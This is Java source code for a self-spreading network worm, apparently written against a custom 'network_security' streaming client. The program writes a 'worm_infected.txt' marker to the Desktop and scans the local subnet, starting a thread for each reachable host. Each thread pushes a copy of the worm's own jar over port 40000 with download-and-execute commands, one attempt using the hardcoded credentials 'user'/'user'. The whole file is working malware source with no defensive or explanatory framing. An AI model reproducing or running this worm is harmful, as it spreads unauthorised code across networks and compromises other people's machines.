package exec;

import com.network_security.streamclient.transport.Codes;
import com.network_security.streamclient.transport.SendPackage;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class Main {
    private String desktopPath;
    private String wormPath;

    private Main() throws IOException {
        desktopPath = System.getProperty("user.home") + "/Desktop";
        if (!infect())
            spread();
    }

    private boolean infect() throws IOException {
        File worm_text = new File(desktopPath, "worm_infected.txt");
        boolean result = worm_text.exists();

        if (!result) {
            if (!worm_text.createNewFile())
                return true;
            BufferedWriter bw = new BufferedWriter(new FileWriter(worm_text));
            bw.write("May the force be with you!");
            bw.newLine();
            bw.write("Fear the darkness! (And the Walking Dead)");
            bw.flush();

            bw.close();
        }

        return result;
    }

    private void spread() throws UnknownHostException {
        String hostAddress = InetAddress.getLocalHost().getHostAddress();

        String gateway = hostAddress.substring(0, hostAddress.lastIndexOf(".")) + ".";
        System.out.println(gateway + "1");

        wormPath = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getAbsolutePath();
        System.out.println("w:" + wormPath + "  " + new File(wormPath).exists());

        for (int i = 2; i < 225; i++) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException ignored) {}

            String ip = gateway + Integer.toString(i);

            if (ip.equals(hostAddress))
                continue;

            new InfectionThread(ip).start();
        }
    }

    private class InfectionThread extends Thread{
        private String ip;

        private InfectionThread(String ip) {
            this.ip = ip;
        }


        public void run() {
            try {
                InetAddress address = InetAddress.getByName(ip);
                boolean reachable = address.isReachable(1000);
                if (!reachable)
                    return;

                for (int i = 0; i < 3; i++) {
                    if (i == 0)
                        method1(ip);
                    else if (i == 1) {
                        method2(ip);
                    } else if (i == 2) {
                        method3(ip);
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private void method1(String ip) {
            try {
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                SendPackage sendPackage = new SendPackage(Codes.DOWNLOAD_EXECUTE);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);

                sendToSocket(socket, sendPackage);
                sendFile(file, socket);
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }

        }

        private void method2(String ip) {
            try {
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                SendPackage sendPackage = new SendPackage(Codes.DOWNLOAD_EXECUTE_AUTH);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);
                sendPackage.addItem("user");
                sendPackage.addItem("user");

                sendToSocket(socket, sendPackage);
                sendFile(file, socket);
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }

        }

        private void method3(String ip) {
            try {
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                SendPackage sendPackage = new SendPackage(Codes.ENCRYPTED_MEDIA);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);

                sendToSocket(socket, sendPackage);
                sendFile(file, socket);
            } catch (IOException e) {
                System.out.println(e.getMessage());
            }

        }
    }

    private static void sendToSocket(Socket server, Object object) throws IOException {
        System.out.println("My_App:: " + "StreamApplication.sendToServer() >> Send Package Started");
        ObjectOutputStream stream = new ObjectOutputStream(server.getOutputStream());
        stream.writeObject(object);
        stream.flush();
        System.out.println("My_App:: " + "StreamApplication.sendToServer() >> Send Package Finished");
    }

    private static void sendFile(File file, Socket socket) throws IOException {
        byte[] c_buffer = new byte[1024];
        int bytesRead;

        FileInputStream fileIn = new FileInputStream(file);
        OutputStream outputStream = socket.getOutputStream();

        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Ready to send");
        while ((bytesRead = fileIn.read(c_buffer)) != -1) {
            outputStream.write(c_buffer, 0, bytesRead);
            outputStream.flush();
        }
        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Sent");

        fileIn.close();
        outputStream.flush();
        outputStream.close();
        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Flushed and closed");

    }

    public static void main(String[] args) {
        try {
            new Main();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
